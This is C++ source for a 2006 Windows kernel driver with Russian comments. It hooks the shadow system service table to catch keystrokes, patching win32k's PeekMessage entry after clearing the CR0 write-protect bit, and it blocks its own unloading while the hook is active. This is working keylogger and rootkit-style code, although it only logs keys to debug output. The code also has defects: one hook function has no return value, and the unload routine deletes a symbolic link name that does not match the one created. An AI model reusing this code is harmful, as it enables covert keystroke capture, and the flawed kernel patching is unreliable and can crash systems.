// Драйвер для перехвата клавиатурных событий на основе перехвата функций в KeServiceDescriptor
// (С) Зайцев Олег, 2006
#include <StdAfx.h>
#include <ntddk.h>
#include <ntdef.h>
#include <kd5.h>

extern "C" {
	// Указатель на SDT
	extern PSERVICE_DESCRIPTOR_TABLE    KeServiceDescriptorTable;
	// Номер сборки NT - для анализа
	extern  PWORD						NtBuildNumber;
	// Импорт KeAddSystemServiceTable
	NTKERNELAPI NTSTATUS KeAddSystemServiceTable( 
        PVOID  lpAddressTable, 
        BOOLEAN  bUnknown,
        DWORD  dwNumEntries, 
        PVOID  lpParameterTable,
        DWORD dwTableID );
}

// Указатель на системную функцию PeekMessage
PPeekMessage OldPeekMessage;
// Признак того, что перехратчик установлен
BOOL HookInstalled = false;

// Перехватчик PeekMessage
BOOL NTAPI MyPeekMessage(LPMSG lpMsg,
    HWND hWnd,
    UINT wMsgFilterMin,
    UINT wMsgFilterMax,
    UINT wRemoveMsg)
{
 BOOL Res = OldPeekMessage(lpMsg, hWnd, wMsgFilterMin, wMsgFilterMax, wRemoveMsg);
 // Сообщение WM_KEYDOWN имеет код 0x0100
 if (Res && (lpMsg->message == 0x0100))
	 zDbgPrint("KBD Code = %d, hWnd = %d", lpMsg->lParam, lpMsg->hwnd);
 return Res;
}

PSERVICE_DESCRIPTOR_TABLE FindShadowTable()
{
  // При поиске пропускаем первые 5 байт (mov edi, edi; push ebp; mov ebp, es)
  PBYTE  ScanPtr = (BYTE*) KeAddSystemServiceTable + 5, CmpKiSTPtr = NULL;
  // Поиск команды 83 B8 xx xx xx xx 00, где xx xx xx xx = KeServiceDescriptorTable
  for (int i=0; i < 30; i++)
  {
	  if (*(ScanPtr - 2) == 0x83 && *(ScanPtr - 1) == 0xB8 &&
		  *(PDWORD)ScanPtr == (DWORD)KeServiceDescriptorTable) {
			  zDbgPrint(">> cmp KeServiceDescriptorTable[eax] found at %d", i); 
			  CmpKiSTPtr = (ScanPtr - 2);
			  break;
		  }
	  ScanPtr++;   
  }
  // Команда "cmp KeServiceDescriptorTable[eax], 0" не обнаружена ?
  if (!CmpKiSTPtr)
	  return 0;
  // Пропускаем команду 
  ScanPtr = CmpKiSTPtr + 9;
  for (int i=0; i < 16; i++) {
	  if (*(ScanPtr - 2) == 0x8D && *(ScanPtr - 1) == 0x88) {
			  zDbgPrint(">> lea ecx, KeServiceDescriptorTableShadow[eax] found at %d", i); 
			  return (PSERVICE_DESCRIPTOR_TABLE)*(PDWORD)ScanPtr;
			  break;
		  }
	  ScanPtr++;   
  }
  return NULL;
}


NTSTATUS SetKiSTShadowHook(BOOL ASetHook)
{
	// Защита от повторной установки/удаления перехватчика
	if ((HookInstalled && ASetHook) || (!HookInstalled && !ASetHook)) 
		return STATUS_UNSUCCESSFUL;
	int PeekMessageCode = -1;
	switch (*NtBuildNumber) {
   case  2195:  // Win 2k
	   break;
   case 2600:   // Win XP
	   PeekMessageCode = 0x1DA;
	   break;
   case 3790:  // W2K3
	   break;
	}
	// Для текущей операционной системы не удалось определить код функции
	if (PeekMessageCode == -1) 
		return STATUS_UNSUCCESSFUL;

	// Поиск KeServiceDescriptorTableShadow
	PSERVICE_DESCRIPTOR_TABLE    KeServiceDescriptorTableShadow = FindShadowTable();
	zDbgPrint("KeServiceDescriptorTableShadow = %X", KeServiceDescriptorTableShadow );
	// Если адрес таблицы KeServiceDescriptorTableShadow определить не удается, то
	// далее продолжать нет смысла
	if (!KeServiceDescriptorTableShadow) 
     return STATUS_UNSUCCESSFUL;
	// Вывод полей для отладки
	zDbgPrint("KeServiceDescriptorTableShadow->win32k.ServiceLimit = %d", KeServiceDescriptorTableShadow->win32k.ServiceLimit);
	zDbgPrint("KeServiceDescriptorTableShadow->win32k.ServiceTable = %X", KeServiceDescriptorTableShadow->win32k.ServiceTable);

	DWORD OldCR0;	  
	// Повышение приоритета
	KIRQL OldIRQL = KeRaiseIrqlToDpcLevel();			 

	// Сброс WP бита
	_asm {
		mov eax,CR0
		mov OldCR0,eax
		and eax,0xFFFEFFFF			
		mov cr0, eax
	}
	// Перехват PeekMessage
	if (ASetHook) {
		zDbgPrint("Set Hook:");
		OldPeekMessage = (PPeekMessage)*KeServiceDescriptorTableShadow->win32k.ServiceTable[PeekMessageCode];
		zDbgPrint("OldPeekMessage = %X", OldPeekMessage);
		KeServiceDescriptorTableShadow->win32k.ServiceTable[PeekMessageCode]   = (NTPROC)*MyPeekMessage;
		HookInstalled = true;
	} 
	else {
		KeServiceDescriptorTableShadow->win32k.ServiceTable[PeekMessageCode]   = (NTPROC)*OldPeekMessage;
		HookInstalled = false;
	}

	// Восстановление WP бита
	_asm {
		mov eax,OldCR0
		mov cr0,eax
	}
	// Восстановление приоритета
	KeLowerIrql(OldIRQL);
}


// Функция, отвечающая за выгрузку драйвера
VOID DriverUnload (PDRIVER_OBJECT DriverObject)
{
    UNICODE_STRING usSymbolicLinkName; 
    // Удаляем ссылку
    RtlInitUnicodeString(&usSymbolicLinkName, L"\\DosDevices\\KD5Link2");
    IoDeleteSymbolicLink(&usSymbolicLinkName);
    // Отключаем фильтр
	SetKiSTShadowHook(false);
    IoDeleteDevice(DriverObject->DeviceObject);
 }


// ***** Обработчик событий Открытия/Закрытия/Очистки *****
NTSTATUS DispatchCreateCloseControl (PDEVICE_OBJECT pDeviceObject,
                           PIRP           pIrp)
{
	PIO_STACK_LOCATION pisl;
	DWORD              dInfo = 0;
	NTSTATUS           ns    = STATUS_NOT_IMPLEMENTED; // Код возврата

	// Получаем размещение IRP стека
	pisl = IoGetCurrentIrpStackLocation (pIrp);
	zDbgPrint("Device Open !");	
	// Проверяем код поддерживаемых функций
	switch (pisl->MajorFunction)
	{
	case IRP_MJ_CREATE:
	case IRP_MJ_CLEANUP:
	case IRP_MJ_CLOSE:
		{
			ns = STATUS_SUCCESS;
			break;
		}
	}

	// Завершаем IRP запрос
	pIrp->IoStatus.Status      = ns;
	pIrp->IoStatus.Information = dInfo;
	IoCompleteRequest (pIrp, IO_NO_INCREMENT);
	return ns;
}

// ***** Обработчик событий IO Control *****
NTSTATUS DispatchControl (PDEVICE_OBJECT pDeviceObject,
						  PIRP           pIrp)
{
	PIO_STACK_LOCATION pisl;
	DWORD              dInfo = 0;
	NTSTATUS           ns    = STATUS_NOT_IMPLEMENTED; // Код возврата
	// Получение расположения IRP стека
	pisl = IoGetCurrentIrpStackLocation (pIrp);

	// Код управление 
	ULONG  IoControlCode		  = pisl->Parameters.DeviceIoControl.IoControlCode;
	zDbgPrint("IoControlCode = %x\n", IoControlCode);	

	// IOCTL_SETKBDHOOK - установка перехватчка
	if (IoControlCode == IOCTL_SETKBDHOOK) {
	  // Устанавливаем перехватчик
      ns  = SetKiSTShadowHook(true);
	  // Блокируем выгрузку драйвера
	  pDeviceObject->DriverObject->DriverUnload = NULL;        
	}

	// IOCTL_REMOVEKBDHOOK - удаление перехватчка
	if (IoControlCode == IOCTL_REMOVEKBDHOOK) {
	  // Отключаем перехватчик
      ns  = SetKiSTShadowHook(false);
	  // Разрешаем выгрузку драйвера
	  pDeviceObject->DriverObject->DriverUnload = DriverUnload;        
	}

	// Завершение IRP запроса
	pIrp->IoStatus.Status      = ns;
	pIrp->IoStatus.Information = dInfo;
	IoCompleteRequest (pIrp, IO_NO_INCREMENT);
	return ns;  
}

// Точка входа драйвера
NTSTATUS DriverEntry(IN PDRIVER_OBJECT  DriverObject,
                     IN PUNICODE_STRING RegistryPath )
{
    PDEVICE_OBJECT         DeviceObject        = NULL;
    NTSTATUS               ntStatus;
    UNICODE_STRING         usDeviceNameUnicodeString;
    UNICODE_STRING         usDeviceLinkUnicodeString;

    
    // Подготовка Unicode строк
    RtlInitUnicodeString (&usDeviceNameUnicodeString,
                          L"\\Device\\KD5");
    RtlInitUnicodeString (&usDeviceLinkUnicodeString,
                          L"\\DosDevices\\KD5Link" );
    // Создание устройства
    ntStatus = IoCreateDevice (DriverObject,
                               sizeof(DEVICE_OBJECT),
                               &usDeviceNameUnicodeString,
                               FILE_DEVICE_UNKNOWN,
                               0,
                               TRUE,
                               &DeviceObject);
    // Выход в случае ошибки при создании устройства
    if (!NT_SUCCESS(ntStatus)) {
		zDbgPrint("IoCreateDevice error");
        return ntStatus;
    }
    
    // Создание символьной ссылки     
    ntStatus = IoCreateSymbolicLink (&usDeviceLinkUnicodeString,
                                     &usDeviceNameUnicodeString );
    if (!NT_SUCCESS(ntStatus)) {
		DbgPrint("DriverEntry: IoCreateSymbolicLink error\n");
        IoDeleteDevice(DeviceObject);
        return ntStatus;
    }
    
	// Подключение обработчика DEVICE_CONTROL	 
	DriverObject->MajorFunction [IRP_MJ_DEVICE_CONTROL] = DispatchControl;
	// Подключение обработчиков CREATE/CLOSE/CLEANUP
	DriverObject->MajorFunction [IRP_MJ_CLEANUP] =
	DriverObject->MajorFunction [IRP_MJ_CREATE] = 
	DriverObject->MajorFunction [IRP_MJ_CLOSE] =  DispatchCreateCloseControl;
	// Подключение обработчика, отвечающего за выгрузку драйвера
    DriverObject->DriverUnload  = DriverUnload;
    return ntStatus;
}
